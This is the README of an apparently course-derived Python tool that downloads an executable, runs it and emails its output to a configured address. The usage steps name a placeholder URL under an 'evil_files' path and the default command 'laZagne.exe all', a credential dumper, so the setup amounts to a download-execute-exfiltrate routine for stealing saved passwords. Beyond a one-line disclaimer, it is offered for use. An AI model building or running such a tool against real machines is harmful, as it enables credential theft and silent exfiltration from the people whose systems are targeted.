## Download, Execute, and Report

A Python script that downloads an executable file, runs it, retrieves its output, and emails the result to a specified address.

### Features

- Downloads a file from a specified URL and executes it
- Captures and emails the output to a provided email address
- Cleans up by deleting the downloaded file after execution

### Usage

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/Daniel-Ikenna/download_execute_and_report
   ```

2. **Configure Settings**:
   - Replace `sender's_email` and `sender's_email_password` in the script with your email credentials.
   - Replace the download URL (`http://192.168.**.**/evil_files/file.exe`) with the URL of the executable you want to download and run.
   - Modify the command `laZagne.exe all` as needed for the downloaded file.

3. **Run the Script**:
   ```bash
   python download_execute_and_report.py
   ```

### Requirements

- Python 3.x
- `requests` library (install via `pip install requests`)
- `smtplib` (included with Python)
- Windows environment with permissions to run the specified command

### Important Note

This tool is strictly for authorized, ethical, and educational purposes only. Unauthorized usage on machines without permission is illegal.

### Authors

- [Zaid Sabih](https://ie.linkedin.com/in/zaid-sabih-al-quraishi-5444a6127)
- [Uzoeshi Daniel](https://www.linkedin.com/in/daniel-ikenna-33b709235)
